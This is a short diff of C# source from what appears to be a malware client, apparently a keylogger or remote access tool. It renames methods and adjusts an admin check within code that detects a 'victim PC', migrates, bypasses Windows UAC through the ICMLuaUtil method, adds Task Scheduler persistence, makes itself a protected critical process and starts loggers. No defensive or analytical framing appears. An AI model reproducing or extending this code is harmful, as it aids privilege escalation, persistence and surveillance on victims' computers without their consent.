@@ -23,12 +23,12 @@ namespace Client
             if (!Constants.IsInVictimPC()) Migrate();
 
             /// Attempt to be God.
-            if (!Utilities.Environment.IsAdmin())
+            if (!Constants.IsAdmin())
                 Armitage.UAC.UACBypass.QuickStart(Armitage.UAC.UACMethods.ICMLuaUtil);
             else
             {
                 Armitage.Startup.ViaTaskScheduler();
-                LoveCannotBeKilled();
+                ProtectTheLetter();
             }
 
             /// Start loggers.
@@ -55,9 +55,9 @@ namespace Client
         /// <summary>
         /// Turn into a system process.
         /// </summary>
-        public static void LoveCannotBeKilled()
+        public static void ProtectTheLetter()
         {
-            Armitage.My_Love.Protect();
+            Armitage.Critical_Process.Protect();
         }
 
         public static void Migrate()
